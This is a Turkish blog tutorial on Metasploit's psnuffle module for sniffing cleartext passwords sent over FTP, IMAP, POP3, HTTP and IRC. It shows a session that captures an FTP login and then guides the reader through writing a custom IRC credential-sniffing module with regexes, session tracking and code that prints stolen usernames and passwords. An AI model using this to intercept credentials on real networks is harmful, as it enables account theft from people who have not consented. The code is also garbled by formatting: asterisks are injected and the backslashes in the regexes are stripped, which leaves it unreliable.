---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-16T12:56:00Z"
excerpt: Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri
  üzerinden gönderilen parolaları dinleyebilirsiniz. Bu amaçla ‘psnuffle‘ modülü bulunmaktadır.
guid: https://www.siberoloji.com/?p=1157
id: 1157
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF İçinde Parola Dinleme
url: /tr/msf-icinde-parola-dinleme/
---

  Metasploit kullanarak, ağda bulunan pop3, imap, ftp ve HTTP protokolleri üzerinden gönderilen parolaları dinleyebilirsiniz. Bu amaçla ‘psnuffle‘ modülü bulunmaktadır. 
 

  <code>psnuffle</code>&nbsp;modülü, neredeyse hiçbir ayarlama yapmaya gerek kalmadan kullanılabilir. İsterseniz dışarıdan PCAP dosyası ithal edebilirsiniz. Buradaki örnekte, ayarlar olduğu gibi kullanılacaktır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use auxiliary/sniffer/psnuffle
msf auxiliary***(*** psnuffle***)***  ***&gt;***  show options

Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILTER                      no        The filter string ***for *** capturing traffic
   INTERFACE                   no        The name of the interface
   PCAPFILE                    no        The name of the PCAP capture file to process
   PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".
   SNAPLEN    65535            yes       The number of bytes to capture
   TIMEOUT    1                yes       The number of seconds to wait ***for *** new data

msf auxiliary***(*** psnuffle***)***  ***&gt;***  run
***[*** ******* ***]***  Auxiliary module execution completed
***[*** ******* ***]***  Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...
***[*** ******* ***]***  Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...
***[*** ******* ***]***  Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...
***[*** ******* ***]***  Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
***[*** ******* ***]***  Sniffing traffic.....
***[*** ******* ***]***  Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 ***&gt;&gt;***  victim / pass ***(*** 220 3Com 3CDaemon FTP Server Version 2.0***)*** 
</code></pre>
<!-- /wp:code -->

  Gördüğünüz gibi FTP protokolünde&nbsp;<code>victim</code>&nbsp;kullanıcı adı ve&nbsp;<code>pass</code>&nbsp;parolası ortaya çıkarıldı. 
 

 
<h2 class="wp-block-heading" id="psnuffle-özelleştirme">Psnuffle Özelleştirme
<!-- /wp:heading -->

  İsterseniz,&nbsp;<code>psnuffle</code>&nbsp;aracını, varsayılan olarak dinlediği protokoller haricinde diğer protokoller için de tasarlayabilirsiniz. 
 

  Bu özelleştirme işlemi için yapılacak modüller, data/exploits/psnuffle klasörünün içine kaydedilmelidir. Yeni bir modül geliştirmek için öncelikle var olan bir modülü şablon olarak kullanabiliriz. 
 

  Aşağıda, POP3 modülünün Düzenli ifadeler kısmı görülmektedir. Bu düzenli ifadeler, dinleme esnasında hangi tür şablona uyan verilerin dikkate alınacağını tanımlamaktadır. Bir miktar karışık gibi görünebilir. Ancak düzenli ifadeleri öğrenmenizi tavsiye ediyoruz. Her yerde karşınıza çıkar ve öğrenirseniz, işinizi kolaylaştırırlar. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">self.sigs ***=***  ***{*** 
:ok ***=&gt;***  /^***(*** +OK[^n]******* ***)*** n/si,
:err ***=&gt;***  /^***(*** -ERR***[*** ^n]******* ***)*** n/si,
:user ***=&gt;***  /^USERs+***([*** ^n]+***)*** n/si,
:pass ***=&gt;***  /^PASSs+***([*** ^n]+***)*** n/si,
:quit ***=&gt;***  /^***(*** QUITs******* ***[*** ^n]******* ***)*** n/si ***}*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="irc-modülü">IRC Modülü
<!-- /wp:heading -->

  Aşağıdaki örneklerde, IRC protokolü için yazılmış bir modülde olması gerekenleri görebilirsiniz. 
 

  Öncelikle, dikkate alınacak sinyal tiplerini tanımlayalım. Buradaki IRC komutlarından IDENTIFY, her IRC sunucu tarafından kullanılmamaktadır. En azında Freenode bu şekilde kullanır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">self.sigs = {
:user =&gt; /^(NICKs+[^n]+)/si,
:pass =&gt; /b(IDENTIFYs+[^n]+)/si,}
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="oturum-tanımlama-session">Oturum Tanımlama (Session)
<!-- /wp:heading -->

  Her modül için mutlaka tanımlanması gereken kısım, hangi Portlar ile ilgileneceğidir. Bu tanımlama için aşağıdaki şablonu kullanabilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***return if *** not pkt[:tcp] <em># We don't want to handle anything other than tcp</em>
***return if***  ***(*** pkt[:tcp].src_port ***!=***  6667 and pkt[:tcp].dst_port ***!=***  6667***)***  <em># Process only packet on port 6667</em>

<em>#Ensure that the session hash stays the same for both way of communication</em>
***if***  ***(*** pkt[:tcp].dst_port ***==***  6667***)***  <em># When packet is sent to server</em>
s ***=***  find_session***(*** "#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}"***)*** 
***else***  <em># When packet is coming from the server</em>
s ***=***  find_session***(*** "#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}"***)*** 
end
</code></pre>
<!-- /wp:code -->

  Şimdi ise&nbsp;<code>self.sigs</code>&nbsp;bölümünde şablonu oluşturulan türde bir paket yakalandığında ne yapılacağını ayarlamanız gerekmekte. Bunun için de aşağıdaki şablonu kullanabilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***case***  matched
when :user <em># when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content</em>
s[:user]***=*** matches <em>#Store the name into the session hash s for later use</em>
<em># Do whatever you like here... maybe a puts if you need to</em>
when :pass <em># When the pattern "/b(IDENTIFYs+[^n]+)/si" is matching</em>
s[:pass]***=*** matches <em># Store the password into the session hash s as well</em>
***if***  ***(*** s[:user] and s[:pass]) <em># When we have the name and the pass sniffed, print it</em>
print "-&gt; IRC login sniffed: #{s[:session]} &gt;&gt; username:#{s[:user]} password:#{s[:pass]}n"
end
sessions.delete***(*** s[:session]***)***  <em># Remove this session because we dont need to track it anymore</em>
when nil
<em># No matches, don't do anything else # Just in case anything else is matching...</em>
sessions[s[:session]].merge!***({*** k ***=&gt;***  matches***})***  <em># Just add it to the session object</em>
end
</code></pre>
<!-- /wp:code -->

  Tebrikler kendi modülünüzü yazdınız. 
 